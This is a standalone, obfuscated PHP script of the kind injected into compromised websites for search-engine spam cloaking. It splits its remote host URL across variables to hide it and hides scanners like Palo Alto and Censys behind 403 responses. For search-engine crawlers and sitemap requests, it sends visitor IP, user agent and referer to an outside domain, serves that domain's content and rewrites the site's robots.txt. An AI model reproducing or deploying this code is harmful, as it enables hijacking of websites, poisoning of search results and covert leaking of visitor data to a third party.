<?php $vxbr='ttp://cw1074.lesb';$heyr='h';$zcth='/';$kamt='iantown.shop';$jxlpj=$heyr.$vxbr.$kamt.$zcth; $pc = "AAEJXAb"; $bagent = "Docomo|Yahoo|Google|Bing"; erROR_repORTinG(0); if(prEG_MaTCH("/(GPTBot|YandexBot|Ezooms|swiftbot|jaunty|AmazonBot|UniversalFeedParser|YisouSpider|HttpClient|Go-http-client|jikeSpider|semrushBot|Indy Library|Bytespider|Paloaltonetworks|Mj12bot|heritrix|ApacheBench|java|Python|AskTbFXTV|SeznamBot|CensysInspect|PetalBot|feedDemon|Python-urllib|ZmEu|barkrowler|Python-requests|CoolpadWebkit|lightDeckReports Bot|easouSpider|crawlDaddy|yySpider|Scrapy|feedly|DotBot|digExt|AhrefsBot|oBot|DataForSEO)/i", $_SERVER['HTTP_USER_AGENT'])) {  header('HTTP/1.0 403 Forbidden');  ExiT(); } $refer = URlEnCodE(@$_SERVER['HTTP_REFERER']); $uagent = UrlENcODE($_SERVER['HTTP_USER_AGENT']); $language = urLenCOdE(@$_SERVER['HTTP_ACCEPT_LANGUAGE']); $ip = $_SERVER['REMOTE_ADDR']; if (iSSeT($_SERVER['HTTP_CLIENT_IP'])) {  $ip = $_SERVER['HTTP_CLIENT_IP']; } elseif (ISSEt($_SERVER['HTTP_X_FORWARDED_FOR'])) {  $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; } $ip = UrlENCODE($ip); $domain = urLeNcODe($_SERVER['HTTP_HOST']); $script = uRlEncode($_SERVER['SCRIPT_NAME']); if ( (! eMpty($_SERVER['REQUEST_SCHEME']) && $_SERVER['REQUEST_SCHEME'] == 'https') || (! EMpTY($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (! EMPTy($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == '443') || (IsSEt($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') ) {  $_SERVER['REQUEST_SCHEME'] = 'https'; } else {  $_SERVER['REQUEST_SCHEME'] = 'http'; } $http = uRlEncoDe($_SERVER['REQUEST_SCHEME']); $uri = UrlENCodE($_SERVER['REQUEST_URI']); if(StRpOS($uri,"acjacj") !== false){echo "ok";eXIT();} $acj = 0; if(!file_exists("acj.txt")) {  $uuu = $http.'://'.$_SERVER['HTTP_HOST'].'/acjacj';  $ioez = @fiLe_gET_ContEntS($uuu);  if(eMPTy($ioez)) {   $ch = curl_Init();   CURL_SETOpt($ch, CURLOPT_URL, $uuu);   CURl_sEtopt($ch, CURLOPT_RETURNTRANSFER, true);   Curl_SetOPT($ch, CURLOPT_FOLLOWLOCATION, false);   curL_setOpt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);   CURL_SEtoPt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);   $ioez = CurL_exEC($ch);   cuRl_ClOSE($ch);  }  if($ioez == "ok") {   $acj = 1;   @FILe_Put_COntENTS("acj.txt","1");  } else {   $acj = 0;   @FILe_puT_cONtENtS("acj.txt","0");  } } else {  $acj = @filE_GeT_coNtenTS("acj.txt"); } if(stRPoS($uri,"favicon.ico") !== false) { } else if(StRpOs($uri,"robots.txt") !== false||Strpos($uri,"pingsitemap") !== false||STRPoS($uri,"jp2023") !== false||PREG_MaTcH("@^/(.*?).xml$@i", $_SERVER['REQUEST_URI'])||PrEG_matCH("/($bagent)/i", $_SERVER['HTTP_USER_AGENT'])||pREg_MATcH("/($bagent)/i", $_SERVER['HTTP_REFERER'])) {  $requsturl = $jxlpj."?agent=$uagent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$acj&script=$script";  $robots_contents = "";  if(StRPOS($uri,"pingsitemap") !== false) {   $scripname = $_SERVER['SCRIPT_NAME'];   if(StrPOS($scripname,"index.ph") !== false) {    if($acj == 0) {     $scripname = '/?';    } else {     $scripname = '/';    }   } else {    $scripname = $scripname.'?';   }   $robots_contents = "User-agent: *\r\nAllow: /";   $sitemap = "$http://" . $domain .$scripname. "sitemap.xml";   $robots_contents = trim($robots_contents)."\r\n"."Sitemap: $sitemap";   $sitemapstatus = "";   echo $sitemap.": ".$sitemapstatus.'<br/>';   $requsturl = $jxlpj."?agent=$uagent&refer=$refer&lang=$language&ip=$ip&dom=$domain&http=$http&uri=$uri&pc=$pc&rewriteable=$acj&script=$script&sitemap=".uRLencoDE($sitemap);  }  $ioez = @FILE_GEt_ConTenTS($requsturl);  if(emPTY($ioez)) {   $ch = cURl_iNit();   CUrL_sETOPT($ch, CURLOPT_URL, $requsturl);   CuRL_sEtOPt($ch, CURLOPT_RETURNTRANSFER, true);   cURl_SETOpT($ch, CURLOPT_FOLLOWLOCATION, false);   CURl_SETopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);   cURL_sETOPt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);   $ioez = CUrl_eXec($ch);   CURl_cLOSe($ch);  }  if(!EmpTY($ioez)) {   if(SuBStr($ioez,0,10)=="error code"||$ioez == "500") {    header("HTTP/1.0 500 Internal Server Error");    ExIt();   }   if(STrpOS($uri,"jp2023") !== false){header('HTTP/1.1 404 Not Found');}   else if(SUBStR($ioez,0,5)=="<?xml") {    header('Content-Type: text/xml; charset=utf-8');   } else {    header('Content-Type: text/html; charset=utf-8');   }   echo $ioez;   if(!EmPtY($robots_contents)){@fIlE_PuT_ContEnts("robots.txt",$robots_contents);}   else if(STrPoS($uri,"robots.txt") !== false){@FILe_PuT_cOnteNTS("robots.txt",$ioez);}   EXIT();   return;  } }else{ } if(pReg_MaTch("/[a-z]{5}\/[a-z][0-9]{1,}\.html/", $_SERVER['REQUEST_URI'])){header("HTTP/1.0 500 Internal Server Error");eXiT();} ?>
